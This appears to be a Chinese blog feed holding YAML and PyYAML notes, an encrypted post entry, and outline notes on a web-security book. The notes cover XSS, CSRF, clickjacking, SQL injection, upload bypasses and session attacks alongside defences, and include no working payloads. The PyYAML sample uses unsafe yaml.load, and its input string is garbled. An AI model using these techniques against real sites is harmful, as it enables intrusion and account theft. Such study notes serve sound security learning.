href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><ul><li>如果字符串没有空格或特殊字符，不需要加引号，但如果其中有空格或特殊字符，则需要加引号了</li><li>双引号中的特殊字符会被python解释，单引号不会</li><li>单引号里面的还有单引号需要，里面的需要写两个单引号</li><li>字符串可以写多行，从第二行开始必须有一个单空格缩进，每行字符解释后会变成空格，即换行符被转成空格，要保留换行符，需要使用”|‘,注意前面要加一个空格</li><li>|可以保留换行符，&gt;可以折叠换行符，这个符号好像没什么用，跟直接写多行一样</li><li><p>表示保留文字块末尾的换行，-表示删除字符串末尾的换行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yaml: |+      # 注意 &quot;:&quot; 与 &quot;|&quot; 之间的空格</span><br><span class="line">   JSON的语法其实是YAML的子集，大部分的JSON文件都可以被YAML的解释器解释。</span><br><span class="line">   如果你想更深入的学习YAML，我建议你去 http://www.yaml.org 看看</span><br></pre></td></tr></table></figure></li><li><p>表示保留文字块末尾的换行，-表示删除字符串末尾的换行</p></li><li></li></ul><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>锚点<code>&amp;</code>和别名<code>*</code>，可以用来引用。</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; </span><br><span class="line">&gt; defaults: &amp;defaults</span><br><span class="line">&gt;   adapter:  postgres</span><br><span class="line">&gt;   host:     localhost</span><br><span class="line">&gt; </span><br><span class="line">&gt; development:</span><br><span class="line">&gt;   database: myapp_development</span><br><span class="line">&gt;   &lt;&lt;: *defaults</span><br><span class="line">&gt; </span><br><span class="line">&gt; test:</span><br><span class="line">&gt;   database: myapp_test</span><br><span class="line">&gt;   &lt;&lt;: *defaults</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>等同于下面的代码。</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; </span><br><span class="line">&gt; defaults:</span><br><span class="line">&gt;   adapter:  postgres</span><br><span class="line">&gt;   host:     localhost</span><br><span class="line">&gt; </span><br><span class="line">&gt; development:</span><br><span class="line">&gt;   database: myapp_development</span><br><span class="line">&gt;   adapter:  postgres</span><br><span class="line">&gt;   host:     localhost</span><br><span class="line">&gt; </span><br><span class="line">&gt; test:</span><br><span class="line">&gt;   database: myapp_test</span><br><span class="line">&gt;   adapter:  postgres</span><br><span class="line">&gt;   host:     localhost</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p><code>&amp;</code>用来建立锚点（<code>defaults</code>），<code>&lt;&lt;</code>表示合并到当前数据，<code>*</code>用来引用锚点。</p><p>下面是另一个例子。</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; </span><br><span class="line">&gt; - &amp;showell Steve </span><br><span class="line">&gt; - Clark </span><br><span class="line">&gt; - Brian </span><br><span class="line">&gt; - Oren </span><br><span class="line">&gt; - *showell </span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>转为 JavaScript 代码如下。</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; </span><br><span class="line">&gt; [ &apos;Steve&apos;, &apos;Clark&apos;, &apos;Brian&apos;, &apos;Oren&apos;, &apos;Steve&apos; ]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h1 id="在python中的使用"><a href="#在python中的使用" class="headerlink" title="在python中的使用"></a>在python中的使用</h1><p>PyYaml是Python的一个专门针对yaml文件操作的模块，使用起来非常简单。</p><ol><li>安装：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install PyYaml</span><br></pre></td></tr></table></figure><p>或者到<a href="http://pyyaml.org/" target="_blank" rel="noopener">这里</a>下载相应版本的包，人工安装，<a href="http://pyyaml.org/wiki/PyYAML" target="_blank" rel="noopener">http://pyyaml.org/wiki/PyYAML</a> <a href="http://pyyaml.org/wiki/PyYAML" target="_blank" rel="noopener">点击打开链接</a>。</p><ol><li>使用：</li></ol><p>使用起来非常简单，就像json、pickle一样，load、dump就足够我们使用了。</p><ul><li><code>load()</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import yaml </span><br><span class="line">yaml_str = &quot;&quot;&quot;name: 灰蓝age: 0job: Tester&quot;&quot;&quot; </span><br><span class="line">y = yaml.load(yaml_str)</span><br><span class="line">print y</span><br></pre></td></tr></table></figure><p>结果：{‘job’: ‘Tester’, ‘age’: 0, ‘name’: u’\u7070\u84dd’}</p><ul><li><code>dump()</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import yaml </span><br><span class="line">python_obj = &#123;&quot;name&quot;: u&quot;灰蓝&quot;,&quot;age&quot;: 0,&quot;job&quot;: &quot;Tester&quot; &#125; </span><br><span class="line">y = yaml.dump(python_obj,default_flow_style=False)</span><br><span class="line">print y</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age: 0</span><br><span class="line">job: Tester</span><br><span class="line">name: &quot;\u7070\u84DD&quot;</span><br></pre></td></tr></table></figure><p>上面只是简单的两个应用，还有 <code>load_all()</code>、<code>dump_all()</code> 等，我们一般用这四个足够了，另外两个下面会讲到，其他方法可以自己看API，我也没怎么折腾过</p><p>- </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;笔记&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="杂乱" scheme="http://blog.wendelltong.xyz/categories/%E6%9D%82%E4%B9%B1/"/>
    
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="程序设计比赛" scheme="http://blog.wendelltong.xyz/tags/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%AF%94%E8%B5%9B/"/>
    
      <category term="yaml" scheme="http://blog.wendelltong.xyz/tags/yaml/"/>
    
  </entry>
  
  <entry>
    <title>网安程序设计比赛文档</title>
    <link href="http://blog.wendelltong.xyz/old_post/%E7%BD%91%E5%AE%89%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%AF%94%E8%B5%9B%E6%96%87%E6%A1%A3.html"/>
    <id>http://blog.wendelltong.xyz/old_post/网安程序设计比赛文档.html</id>
    <published>2019-04-21T11:53:54.000Z</published>
    <updated>2019-04-21T14:31:16.000Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="杂乱" scheme="http://blog.wendelltong.xyz/categories/%E6%9D%82%E4%B9%B1/"/>
    
    
      <category term="网安程序设计比赛文档" scheme="http://blog.wendelltong.xyz/tags/%E7%BD%91%E5%AE%89%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%AF%94%E8%B5%9B%E6%96%87%E6%A1%A3/"/>
    
  </entry>
  
  <entry>
    <title>白帽子讲web安全笔记</title>
    <link href="http://blog.wendelltong.xyz/old_post/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.html"/>
    <id>http://blog.wendelltong.xyz/old_post/白帽子讲web安全笔记.html</id>
    <published>2019-04-13T02:31:30.000Z</published>
    <updated>2019-06-01T03:35:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>笔记<br><a id="more"></a></p><h1 id="安全世界观"><a href="#安全世界观" class="headerlink" title="安全世界观"></a>安全世界观</h1><h2 id="web安全简史"><a href="#web安全简史" class="headerlink" title="web安全简史"></a>web安全简史</h2><p><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413112819665.png" alt><br><img src="/old_post/images/atricleImages/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413112850620.png" alt></p><h3 id="web安全的兴起"><a href="#web安全的兴起" class="headerlink" title="web安全的兴起"></a>web安全的兴起</h3><ul><li>动态脚本安全问题</li><li>sql，xss，csrf出现</li><li>web攻击从服务端转向客户端</li><li>新型脚本语言，html5，新的变化</li></ul><h3 id="安全的本质"><a href="#安全的本质" class="headerlink" title="安全的本质"></a>安全的本质</h3><ul><li>信任问题</li><li>安全是一个持续的过程<h3 id="安全三要素"><a href="#安全三要素" class="headerlink" title="安全三要素"></a>安全三要素</h3><ul><li>机密性</li><li>完整性<ul><li>数据内容完整没有别篡改</li><li>数字签名</li></ul></li><li>可用性<ul><li>随需而得</li></ul></li></ul></li></ul><h2 id="白帽子兵法"><a href="#白帽子兵法" class="headerlink" title="白帽子兵法"></a>白帽子兵法</h2><h3 id="Secure-By-Default-原则"><a href="#Secure-By-Default-原则" class="headerlink" title="Secure By Default 原则"></a>Secure By Default 原则</h3><pre><code>- 白名单黑名单- 最小权限原则- 纵深防御原则（Secure by default）    - 将风险分散到系统的个个层面    - 在正确的地方做正确的事- 数据与代码分离原则- 不可预测性原则</code></pre><h2 id="附录（谁来为漏洞买单）"><a href="#附录（谁来为漏洞买单）" class="headerlink" title="附录（谁来为漏洞买单）"></a>附录（谁来为漏洞买单）</h2><pre><code>- 很多问题只是功能，不是漏洞</code></pre><h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><ul><li>当javaScript被认为来自不同源时，请求会被拒绝</li><li>影响源的因素host（域名或ip，ip会被认为为根域名），子域名，端口，协议</li><li>浏览器看的是加载JavaScript文件的页面所在域</li><li><code>&lt;img&gt;&lt;script&gt;&lt;iframe&gt;&lt;link&gt;</code>等标签可以跨域加载资源，其实是带“src”属性的标签，这些资源JavaScript不能读写</li><li>通过目标域http头 access-control-allow-origin 来判断是否可以跨域</li><li></li><li><p>第三方插件也会受同源策略的限制，如flash，Java applet</p><ul><li>flash 会 通过目标网站的crossdomain.xml文件判断</li><li>flash 9 以后，mime检查，根目录检查</li></ul></li><li>ie 8 css跨域漏洞<ul><li>fontFamily 后面的内容被当作了value，从而可以被读</li></ul></li></ul><h2 id="浏览器沙箱"><a href="#浏览器沙箱" class="headerlink" title="浏览器沙箱"></a>浏览器沙箱</h2><ul><li>多进程，行为分离</li></ul><h2 id="恶意网站拦截"><a href="#恶意网站拦截" class="headerlink" title="恶意网站拦截"></a>恶意网站拦截</h2><ul><li>黑名单<ul><li>挂马</li><li>钓鱼</li></ul></li><li><p>evssl证书</p><h2 id="高速发展的浏览器安全"><a href="#高速发展的浏览器安全" class="headerlink" title="高速发展的浏览器安全"></a>高速发展的浏览器安全</h2></li><li><p>浏览器的xss fifter 功能</p></li><li>csp 内容安全策略</li><li>畸形url处理的安全隐患<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413051317496.png" alt><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413051328757.png" alt></li><li>浏览器插件的安全问题</li></ul></li></ul><h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><ul><li>反射型xss</li><li>储存型</li><li>DOM Based XSS</li></ul><h2 id="攻击进阶"><a href="#攻击进阶" class="headerlink" title="攻击进阶"></a>攻击进阶</h2><ul><li>盗取cookie</li><li>伪造get或post请求<ul><li>可能的问题</li><li>提交表单需要验证码<ul><li>获取到验证码，发送到远端服务器，返回解码后内容</li></ul></li><li>修改密码，需要old password <ul><li>画一个登录框，输入密码后，发送的黑客服务器上</li></ul></li></ul></li><li>识别用户浏览器<ul><li>useragent 对象<ul><li>os版本，浏览器版本，系统语言</li></ul></li><li>利用浏览器实现的差异</li></ul></li><li>识别用户安装的软件<ul><li>ie 可以通过判断ActiveX 控件的classid 是否存在，推断安装的软件</li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413053036228.png" alt></li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413053055419.png" alt><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413053119663.png" alt></li></ul></li><li>css History hack<ul><li>利用浏览过的a的样式不同，获取用户的浏览历史，firefox 在2010.3决定修复这个问题</li></ul></li><li>获取本地ip地址<ul><li>安装了java环境，java applet 的接口</li></ul></li></ul><h3 id="攻击平台"><a href="#攻击平台" class="headerlink" title="攻击平台"></a>攻击平台</h3><h3 id="xss-Worm"><a href="#xss-Worm" class="headerlink" title="xss Worm"></a>xss Worm</h3><h3 id="调试javaScript"><a href="#调试javaScript" class="headerlink" title="调试javaScript"></a>调试javaScript</h3><p>firebug</p><h3 id="xss构造技巧"><a href="#xss构造技巧" class="headerlink" title="xss构造技巧"></a>xss构造技巧</h3><h4 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h4><p>类似sql里的宽字节注入</p><p>返回页面时GBK/GB2312 编码，%c1\ 会变成一个unicode 字符，在fireofx会认为是一个字符<br><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413054212900.png" alt><br><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413054225265.png" alt></p><h4 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h4><ul><li>利用事件缩短代码长度</li><li>利用location.hash 藏代码，并且url中#后面的内容不会发送<img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413054649655.png" alt></li><li>如果有多个文本框可以利用注释，或者构造变量</li><li>利用base标签，它可以插入任何位置，可以劫持标签后所有使用相对路径的标签</li><li>利用window.name 的妙用<ul><li>当前窗口的名字，不受同源策略的限制</li><li>黑客可以先利用a.com设置好window.name 然后跳转b.com b.com可以直接eval(name)</li><li>apache 1.3.34，2.0.57，2.2.1及以下<ul><li>服务器出错时，如果请求有Expect 头，会将内容直接返回，形成xss漏洞</li><li>可以利用flash构造expect头，以修补</li><li>java applet<h4 id="anehta-的回旋镖"><a href="#anehta-的回旋镖" class="headerlink" title="anehta 的回旋镖"></a>anehta 的回旋镖</h4></li></ul></li><li>将反射型xss像存储型一样使用</li><li>在a域，嵌入反射型的b域，即可将反射型xss像存储型一样使用</li><li>ie 对<code>&lt;iframe&gt;&lt;img&gt;&lt;link&gt;</code>等标签会拦截cookie的发送，故要利用form 表单，跳转到b，在跳回来，缺点，url地址会变化<h3 id="flash-xss"><a href="#flash-xss" class="headerlink" title="flash xss"></a>flash xss</h3></li></ul></li></ul><p>flash中可以嵌入actionscript 脚本，甚至发起网络连接</p><h3 id="javascript-开发框架"><a href="#javascript-开发框架" class="headerlink" title="javascript 开发框架"></a>javascript 开发框架</h3><p>可能的DOM　Based　XSS　问题</p><h2 id="xss-的防御"><a href="#xss-的防御" class="headerlink" title="xss 的防御"></a>xss 的防御</h2><h3 id="httponly"><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h3><p>给cookie设置这个值，阻止JavaScript读cookie</p><h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><ul><li>同时在客户端服务端检查<ul><li>全局型xss filter，没有输出的全文语境，容易漏报</li><li>可能改变用户输入的语义</li><li>如果在输入的地方统一对数据做了改变，在不同代码输出时，可能显示不同</li></ul></li></ul><h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><h4 id="安全编码函数"><a href="#安全编码函数" class="headerlink" title="安全编码函数"></a>安全编码函数</h4><h4 id="只需要一种编码吗？"><a href="#只需要一种编码吗？" class="headerlink" title="只需要一种编码吗？"></a>只需要一种编码吗？</h4><ul><li>注意变量的输出语境，<img src="/old_post/images/atricleImages/白帽子讲web安全笔记/html.png" alt="html"></li></ul><h3 id="正确的防御xss"><a href="#正确的防御xss" class="headerlink" title="正确的防御xss"></a>正确的防御xss</h3><p>根据不同的场景，一一解决</p><ul><li>html 标签中输出<ul><li>htmlencode</li></ul></li><li>html 属性中输出<ul><li>htmlencode<img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413103728433.png" alt></li></ul></li><li>在<code>&lt;script&gt;</code> 中输出<ul><li>确保变量在引号中</li><li>同时使用javascriptencode</li></ul></li><li>在事件中输出<ul><li>使用javascriptencode</li></ul></li><li>在css中输出<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413103939499.png" alt></li></ul></li><li>在地址中输出<ul><li>url编码</li><li>如果是整个地址<ul><li>不能直接url编码，可以改变意义</li><li>javascript 伪协议</li><li>dataurl 伪协议 mozilla 支持</li><li>先检查开头是不是http，在url编码<h3 id="富文本处理"><a href="#富文本处理" class="headerlink" title="富文本处理"></a>富文本处理</h3></li></ul></li><li>尽量使用白名单<ul><li>标签</li><li>css</li></ul></li><li>开源过滤项目</li></ul></li></ul><h3 id="防御DOM-Based-XSS"><a href="#防御DOM-Based-XSS" class="headerlink" title="防御DOM Based XSS"></a>防御DOM Based XSS</h3><p>输出到<code>&lt;script&gt;</code>需要转义，从<code>&lt;script&gt;</code>输出到html也要转义<br><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413105600683.png" alt></p><h1 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h1><h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>攻击者在自己的域构造一个页面，利用img标签发送get请求<br>，诱导管理员访问b域执行请求</p><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><h3 id="浏览器的cookie-策略"><a href="#浏览器的cookie-策略" class="headerlink" title="浏览器的cookie 策略"></a>浏览器的cookie 策略</h3><p><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413110333678.png" alt></p><p>session 在内存中，管理tab不会失效，关闭浏览器则失效</p><p>Third-party Cookie 在本地，随设置的失效时间失效</p><p><img src="/old_post/images/atricleImages/白帽子讲web安全笔记/ie，.png" alt="ie，"><br><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190413110539087.png" alt></p><h3 id="P3P头的副作用"><a href="#P3P头的副作用" class="headerlink" title="P3P头的副作用"></a>P3P头的副作用</h3><ul><li>p3p头 用于跨域设置cookie，内嵌的广告页面需要</li><li>问题，设置后ie会不在拦截iframe 等标签的cookie发送</li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>flash</li><li>post 请求<ul><li>可能使用request接受，直接get</li><li>利用表达构造，，javascript 自动提交 </li></ul></li><li>csrf 蠕虫</li></ul><h2 id="csrf防御"><a href="#csrf防御" class="headerlink" title="csrf防御"></a>csrf防御</h2><h3 id="初步"><a href="#初步" class="headerlink" title="初步"></a>初步</h3><ul><li>验证码</li><li><p>referer check</p><h3 id="anti-csrf-token"><a href="#anti-csrf-token" class="headerlink" title="anti csrf token"></a>anti csrf token</h3></li><li><p>加上攻击者猜不到的参数</p><ul><li>哈希加盐加密</li><li>新增一个随机参数token<ul><li>表单增加一个</li><li>在cookie或session存储一个</li></ul></li></ul></li></ul><h4 id="token-使用原则"><a href="#token-使用原则" class="headerlink" title="token 使用原则"></a>token 使用原则</h4><ul><li>要足够随机，不能被预测到，真随机数发生器</li><li>消耗掉需要换一个</li><li>如果存在coookie，多页面提交可能会有文件，解决方法同时生成多个</li><li>token 尽量不要放在url中，否则如果被攻击页面包含了攻击者可以指定地址的图片，可能会通过referer 泄露<ul><li>应尽量放在表达中，以post 或ajax提交</li></ul></li><li>被攻击站网站如果存在xss漏洞，token会失效，称之为xsrf 和 csrf 以示区分</li></ul><h1 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h1><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><ul><li>构造一个不可见的iframe 页面，诱导用户在这个界面操作</li></ul><h2 id="常见攻击"><a href="#常见攻击" class="headerlink" title="常见攻击"></a>常见攻击</h2><ul><li>falsh点击劫持</li><li>图片覆盖攻击<ul><li>XISO 攻击</li><li>通过控制图片的style改变图片位置，诱使用户点击</li></ul></li><li>拖拽劫持与数据窃取<ul><li>浏览器开始支持Drag&amp;Drop API ，用户可以从一个窗口拖到另一个窗口，不受同源策略限制，</li><li>诱使用户从不可间的iframe 拖拽数据到攻击者可以控制的另一个页面</li></ul></li><li>触屏劫持<ul><li>通过一个不可见的iframe 劫持用户的触屏操作<h2 id="防御-clickJacking"><a href="#防御-clickJacking" class="headerlink" title="防御 clickJacking"></a>防御 clickJacking</h2></li></ul></li></ul><h3 id="禁止frame"><a href="#禁止frame" class="headerlink" title="禁止frame"></a>禁止frame</h3><ul><li>frame busting 利用javascript 禁止frame嵌套<ul><li>可能被多层嵌套绕过</li><li>html5 的dandbox 属性，ie iframe的security 属性可以禁止iframe 的javaScript 脚本执行，使frame busting 失效</li></ul></li></ul><h3 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h3><ul><li>值为DENY 时，浏览器会拒绝加载frame页面</li><li>值为SAMEORIFIN ，只允许同源</li><li>ALLOW-FROM 则可以定义允许加载的地址</li></ul><p>firefos 的csp 和noscript扩展也能有效的防御Clickjacking</p><h1 id="html5-安全"><a href="#html5-安全" class="headerlink" title="html5 安全"></a>html5 安全</h1><h2 id="新的标签"><a href="#新的标签" class="headerlink" title="新的标签"></a>新的标签</h2><ul><li>xss绕过问题</li><li>ifame 的sandbox属性<ul><li><code>&lt;iframe&gt;</code>会被看作一个独立的源，可以利用sandbox实现更精准的控制</li></ul></li><li><code>&lt;a&gt;和&lt;area&gt;</code> 定义了一个新的rel(Link typees) ： noreferrer , 加上此标签则不会发生refererm</li><li>cancas<ul><li>不同于加载一个图片，而是画布</li><li>甚至可以利用它破解验证码</li></ul></li></ul><h2 id="其他安全问题"><a href="#其他安全问题" class="headerlink" title="其他安全问题"></a>其他安全问题</h2><ul><li>cross-origin resource sharing <ul><li>a 跨域访问b，a的请求带origin 参数，b 中access-control-allow-origin 会写允不允许跨域</li></ul></li><li>postMessage <ul><li>允许像window（当前，弹出，iframes等） 发送消息</li></ul></li><li>web storage<ul><li>session storage 浏览器关闭即消失</li><li>local storage</li></ul></li></ul><h1 id="sql-注入攻击"><a href="#sql-注入攻击" class="headerlink" title="sql 注入攻击"></a>sql 注入攻击</h1><h2 id="初探-1"><a href="#初探-1" class="headerlink" title="初探"></a>初探</h2><ul><li>普通攻击</li><li>报错注入</li><li>盲注</li></ul><h2 id="攻击技巧"><a href="#攻击技巧" class="headerlink" title="攻击技巧"></a>攻击技巧</h2><ul><li>获取数据</li><li>命令执行<ul><li>自定义函数</li><li>udf</li></ul></li><li>储存过程的攻击<ul><li>xp_cmdshell</li><li>存储过程本身的注入漏洞</li></ul></li><li>编码问题<ul><li>宽字节注入，统一字符集</li></ul></li><li><p>sql column truncation</p><ul><li>sql约束攻击</li><li>超长值可能会截断，导致越权admin+50空格+a<br>-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2></li></ul></li><li><p>初步</p><ul><li>过滤，可能被绕过</li></ul></li><li>使用预编译语句</li><li>使用存储过程</li><li>检查数据类型</li><li>使用安全函数</li></ul><h2 id="其他注入攻击"><a href="#其他注入攻击" class="headerlink" title="其他注入攻击"></a>其他注入攻击</h2><ul><li>xml注入<ul><li>同html注入，因为没有过滤，直接拼接字符串</li><li>XML外部实体注入（XXE）<ul><li>如果xml文档被加载，则可能存在这个漏洞，可以任意读文件</li></ul></li></ul></li><li>代码注入<ul><li>eval() 拼接</li></ul></li><li>CRLF 注入<ul><li>CR 表示\r LF表示\n ，其十六进制编码为0x0d，0x0a，</li><li>CRLF 常用于不同语义的换行符，通过注入CRLF字符则可能改变原理的语义</li><li>通过CRLF可能构造一条新的日志</li><li>注入HTTP头<ul><li>用户提交的数据出现在cookie等地方，可以构造两次换行，结束http头，然后在html中插入xss</li><li>只换行一次，可以构造返回头，<img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416113659194.png" alt><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416113705757.png" alt></li></ul></li></ul></li></ul><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="初探-2"><a href="#初探-2" class="headerlink" title="初探"></a>初探</h2><ul><li>上传检查<ul><li>黑名单绕过</li><li>%00截断</li></ul></li><li>文件头检查<ul><li>图片中插入php代码</li></ul></li><li>apache 1.x，2.x文件解析问题<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416114249817.png" alt></li></ul></li><li><p>iis6文件解析问题</p><ul><li>遇到；会截断<img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416114331744.png" alt></li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416114345252.png" alt><br><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416114738380.png" alt></li></ul></li><li><p>php CGI 路径解析问题</p><ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416115028705.png" alt></li><li>php cgi.fix_pathinfo选项默认开启<ul><li>映射URL 两个环境变量，PATH_INFO,SCRIPT_FILENAME ,映射url时，将递归查询路径确定文件，最后一个不存在则向前递归，<img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416115340165.png" alt></li></ul></li></ul></li><li><p>利用文件上传钓鱼</p><ul><li>302跳转url路径会改变</li><li>上传图片，加入html代码,<img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416115705865.png" alt><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416115646065.png" alt></li></ul></li></ul><h2 id="设计安全的文件上传功能"><a href="#设计安全的文件上传功能" class="headerlink" title="设计安全的文件上传功能"></a>设计安全的文件上传功能</h2><ul><li>上传目录设置为不可执行</li><li>判断文件类型<ul><li>白名单</li><li>对图片使用压缩函数，破坏可能包含的html代码</li></ul></li><li>利用随机数改写文件名和路径</li><li>单独设置文件服务器域名，利用同源策略，使crossdomain.xml，xss利用失效</li></ul><h1 id="认证与会话管理"><a href="#认证与会话管理" class="headerlink" title="认证与会话管理"></a>认证与会话管理</h1><h2 id="初探-3"><a href="#初探-3" class="headerlink" title="初探"></a>初探</h2><ul><li>认证解决的 who am I 的问题</li><li>认证实际上是一个验证凭证的过程，<ul><li>单因素验证</li><li>多因素验证</li></ul></li><li>密码<ul><li>复杂度，不要使用用户公开数据，或个人隐私相关数据，</li><li>服务器存储<ul><li>不可逆加密算法，或单向散列函数算法</li><li>MD5，彩虹表破解，，加盐</li></ul></li></ul></li><li>多因素认证</li></ul><h2 id="session-与认证"><a href="#session-与认证" class="headerlink" title="session 与认证"></a>session 与认证</h2><ul><li>sessionID 储存在cookie中，标识用户信息</li><li>一旦在生命周期被窃取，相当于账户失窃<ul><li>cookie 可能被窃取</li></ul></li><li>早期手机操作系统不支持cookie，sessionid 保存在url中，有很多问题<ul><li>外部图片的引用，referer 头泄露sid</li></ul></li><li>session fixation 攻击<ul><li>a把网页给b，b登录后session 为改变，则a也可能会登录b的账户</li><li>解决登陆后重写sessionid</li></ul></li><li>session 保持攻击<ul><li>session有生命周期<ul><li>一直活动时session保持下去</li></ul></li><li>网站访问量过大，sesson 可能交给浏览器维护，服务器只解密cookie，很多应用利用cookie 的expire标签控制session 